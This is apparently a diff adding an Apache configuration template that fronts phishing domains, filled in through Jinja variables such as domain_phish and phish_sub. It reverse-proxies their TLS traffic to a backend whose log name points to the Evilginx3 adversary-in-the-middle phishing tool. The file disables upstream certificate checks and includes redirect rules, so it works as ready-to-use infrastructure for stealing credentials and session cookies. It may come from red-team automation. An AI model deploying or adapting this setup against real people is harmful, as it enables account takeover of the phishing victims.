@@ -1,0 +1,82 @@
+ServerTokens Prod
+ServerSignature Off
+
+# Global directives
+DocumentRoot /var/www/html
+Header always set X-Frame-Options "SAMEORIGIN"
+Header always set X-XSS-Protection "1; mode=block"
+Header always set X-Content-Type-Options "nosniff"
+Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
+Header always set Referrer-Policy "no-referrer"
+Header always set Permission-Policy "geolocation=(); microphone=(); camera=();"
+Header always set Content-Security-Policy "default-src 'self'; img-src 'self'; script-src 'self'; style-src 'self';"
+
+ErrorDocument 400 /errorpage/error.html
+ErrorDocument 403 /errorpage/error.html
+ErrorDocument 404 /errorpage/error.html
+ErrorDocument 501 /errorpage/error.html
+ErrorDocument 502 /errorpage/error.html
+ErrorDocument 503 /errorpage/error.html
+
+<FilesMatch "^\.ht">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+<Directory /var/www/html>
+    Options -Indexes
+</Directory>
+
+SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1
+SSLCipherSuite EECDH+AESGCM:EDH+AESGCM
+TraceEnable off
+SSLUseStapling on
+SSLStaplingCache "shmcb:logs/stapling-cache(150000)"
+LimitRequestBody 512000
+Timeout 60
+
+<VirtualHost *:443>
+    ServerAlias {{ phish_sub | join(' ') }}
+    
+    SSLEngine on
+    SSLProxyEngine On
+    SSLProxyVerify none
+    SSLProxyCheckPeerCN off
+    SSLProxyCheckPeerName off
+    SSLProxyCheckPeerExpire off
+
+    SSLCertificateFile /etc/letsencrypt/live/{{ domain_phish }}/fullchain.pem
+    SSLCertificateKeyFile /etc/letsencrypt/live/{{ domain_phish }}/privkey.pem
+    
+    ProxyPass /errorpage/ !
+    ProxyPreserveHost On
+    ProxyPass / https://srv.local:8443/
+    ProxyPassReverse / https://srv.local:8443/
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access_evilginx3.log "%h \"%r\" \"%{Referer}i\" \"%{User-Agent}i\""
+
+    Include /etc/apache2/redirect.rules
+
+# <Location />
+#    <RequireAll>
+#        Require all granted
+#        Include /etc/apache2/blacklist.conf
+#    </RequireAll>
+#</Location>
+</VirtualHost>
+
+<VirtualHost *:8080>
+    ServerName {{ domain_phish }}
+    
+    ProxyPass /errorpage/ !
+    ProxyPreserveHost On
+    ProxyPass / https://srv.local:8080/
+    ProxyPassReverse / https://srv.local:8080/
+
+    SSLEngine on
+    SSLCertificateFile /etc/letsencrypt/live/{{ domain_phish }}/fullchain.pem
+    SSLCertificateKeyFile /etc/letsencrypt/live/{{ domain_phish }}/privkey.pem
+
+    ErrorLog ${APACHE_LOG_DIR}/error_8080.log
+    CustomLog ${APACHE_LOG_DIR}/access_8080.log common
+</VirtualHost>
